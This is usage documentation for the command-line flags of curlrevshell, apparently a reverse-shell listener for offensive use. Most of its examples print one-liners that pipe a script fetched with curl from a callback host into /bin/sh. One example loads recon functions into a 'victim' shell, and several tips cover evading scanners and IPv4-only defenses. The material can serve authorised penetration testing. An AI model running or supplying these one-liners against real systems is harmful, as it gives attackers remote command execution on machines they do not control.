Flags
=====
Command-line flags control curlrevshell's behavior.  Running with [`-h`](#-h)
gives you a short list.  Below is a bit more info.  A bit.

`-h`
----
Quick reference, if you already know what to look for.

`-callback-address`
-------------------
Adds one or more addresses to the list of one-liners printed on startup.
Port's optional.

Handy when you've got network tunnels set up and there's no good way for
curlrevshell to figure out what its own address is.  Also handy for sticking a
domain in there.

### Example
Add `kittens.com` and `100.64.10.10:1234` to the list of one-liners.
```
$ curlrevshell -callback-address kittens.com -callback-address 100.64.10.10:1234
17:07:36.936 Listening on 0.0.0.0:4444
17:07:36.936 To get a shell:

curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://kittens.com:4444/c' | /bin/sh
curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://100.64.10.10:1234/c' | /bin/sh
curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c' | /bin/sh
```

`-callback-template`
--------------------
Specifies a different template for the script generated by queries to `/c`.  The
default is in [`internal/hserv/script.tmpl`](../internal/hsrv/script.tmpl) and
can be printed with `-print-default-template`.
Like with `-ctrl-i-file`, the file is re-read every time it's needed,
so no need to restart curlrevshell if you change it.
If the file doesn't exist, the built-in default template will still be used.

Handy for giving curl options or using something totally different on target.

### Example
Serve up a custom template named `./sneaky.tmpl`.
```
# Get the default template
curlrevshell -print-default-template > sneaky.tmpl
# Modify it
vim ./sneaky.tmpl
# Serve it up with /c
curlrevshell -callback-template ./sneaky.tmpl
```

`-ctrl-i-file`
--------------
Sets the name of a file which will be sent to the shell when you Ctrl+I.
The file will be sent as-is, plus a trailing newline.
Like with `-callback-template`, the file is re-read every time it's needed,
so no need to restart curlrevshell if you change it.

Handy for libraries of shell functions and telling people you load modules
in memory over the network.

### Example
Send a shell function library from `./sneaky.subr`.
```
# Make the library
echo 'function recon { id; uname -a; ps awwwfux; }; echo Loaded.' > ./sneaky.subr
# Set it as the file to be sent
curlrevshell -ctrl-i-file ./sneaky.subr
...output...
22:28:02.425 [192.168.178.23] Shell is ready to go!
# Hit Ctrl+I here
22:28:03.453 Inserting ./sneaky.subr...
22:28:03.453 Inserted 59 bytes from ./sneaky.subr
22:28:03.453 SHA256: c13440c514ae4672fef70ebced3afe61f03691f329bdbf6de5f1be41e1824042
Loaded.
> recon
uid=1000(victim) gid=1000(victim) groups=1000(victim), 0(wheel), 117(dialer)
OpenBSD target.example.com 7.5 GENERIC.MP#82 amd64
USER       PID %CPU %MEM   VSZ   RSS TT  STAT   STARTED       TIME COMMAND
root         1  0.0  0.0   916   408 ??  I      10May24    0:00.12 /sbin/init
...process listing...
```

`-icanhazip`
------------
Adds whatever address [icanhazip.com](https://icanhazip.com) gives back to the
list on one-liners printed on startup.  Functionally equivalent to
`-address "$(curl https://icanhazip.com)"`.

Handy for situations where there's inbound NAT happening and keystrokes are at
a premium.

### Example
Also print a one-liner for our external (hopefully) address.
```
$ curlrevshell -icanhazip
17:16:07.924 Listening on 0.0.0.0:4444
17:16:07.924 To get a shell:

curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10/c' | /bin/sh
curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://93.184.216.34:4444/c' | /bin/sh
```

`-ipv6-one-liners`
------------------
Adds the local IPv6 addresses to the list of one-liners.  IPv6 connections are
accepted either way.

Handy for sneaking past defenses that deny the existance of non-IPv4.  Also a
cool party trick.

### Example
Also print a one-liner for our IPv6 address.
```
$ curlrevshell -ipv6-one-liners
17:18:34.802 Listening on 0.0.0.0:4444
17:18:34.802 To get a shell:

curl -sk --pinnedpubkey 'sha256//ZigPt3K4r3wu7o66e5vqOhoS/MNlU1OOvvJ7uke8EsE=' 'https://192.168.1.10:4444/c' | /bin/sh
curl -sk --pinnedpubkey 'sha256//ZigPt3K4r3wu7o66e5vqOhoS/MNlU1OOvvJ7uke8EsE=' 'https://[2001:db8:1234:1234:ab:1234:1234:1234]:4444/c' | /bin/sh
```

`-listen-address`
-----------------
Sets the address on which curlrevshell listens.  If no port is given, a random
port will be chosen.  Use `:0` for a totally random host and port.

Handy for testing locally, not listening where you know scanners scan, and
not having to choose your own port.

### Example
Listen only on loopback, using a random port.
```
$ curlrevshell -listen-address 127.0.0.1
17:21:28.702 Listening on 127.0.0.1:3308
17:21:28.702 To get a shell:

curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://127.0.0.1:3308/c' | /bin/sh
```

`-log`
------
Logs everything to a file, one JSON object per line.  Not easy to read live,
but great for going back and seeing what you did.

Handy for when you forgot to take notes a month ago.

Setting the `CURLREVSHELL_LOG` environment variable sets the default logfile.

### Example
```
# Log everything to log.json
curlrevshell -log log.json
# Or with an environment variable
CURLREVSHELL_LOG=log.json curlrevshell
# Or override the environment variable and log to special.json
CURLREVSHELL_LOG=log.json curlrevshell -log special.json
```

`-no-timestamps`
----------------
Don't print timestamps.

Handy for copy/pasting, sometimes, or for less clutter during demos.

### Example
Don't print timestamps.
```
$ curlrevshell -no-timestamps
Listening on 0.0.0.0:4444
To get a shell:

curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c' | /bin/sh
```

`-one-shell`
------------
Stop listening after a shell has connected.

Handy for having multiple shells at once without having to work out which port
to use.

`-print-default-template`
-------------------------
Prints the default callback script template.  See
[`-callback-template`](#-callback-template) for more information.

`-prompt`
---------
Sets the terminal prompt to something not the default `> `.  Don't forget a
trailing space.

Handy for keeping track of multiple shells at once.

### Example
Set the prompt to `target1>`, which is somewhat easier to see.
```
$ curlrevshell -prompt 'target1> '
17:29:24.015 Listening on 0.0.0.0:4444
17:29:24.015 To get a shell:

curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c' | /bin/sh

target1>
```

`-serve-files-from`
-------------------
Serves up static files from a directory.  If a file is given instead of a
directory, that file is served up for any path not used by shell things.

Handy for staging other tools or if you really just needed a way to HTTP a file
from point A to point B with a minimum of fuss.

### Example
Serve files from `./d`
```
$ ./curlrevshell -serve-files-from ./d
17:32:42.881 Listening on 0.0.0.0:4444
17:32:42.881 To get files from ./d:

curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444'

17:32:42.881 To get a shell:

curl -sk --pinnedpubkey 'sha256//9nkpEPFYzXMxoVTGImPROp+qkk+B1QQIut2jX4qohgY=' 'https://192.168.1.10:4444/c' | /bin/sh
```

`-tls-certificate-cache`
------------------------
Stores the generated TLS key and certificate in the given location.  The
certificate itself is valid for a year, has a CN of `curlrevshell` and no SANs,
and kinda sticks out like a sore thumb.  The default location is usually fine.

The key and certificate are stored in a
[txtar](https://pkg.go.dev/golang.org/x/tools/txtar#hdr-Txtar_format) archive.

Handy for not having to copy/paste one-liners with SHA fingerprints every time.

### Example
Store the certificate in `./c.txtar`.
```
$ curlrevshell -tls-certificate-cache ./c.txtar
```
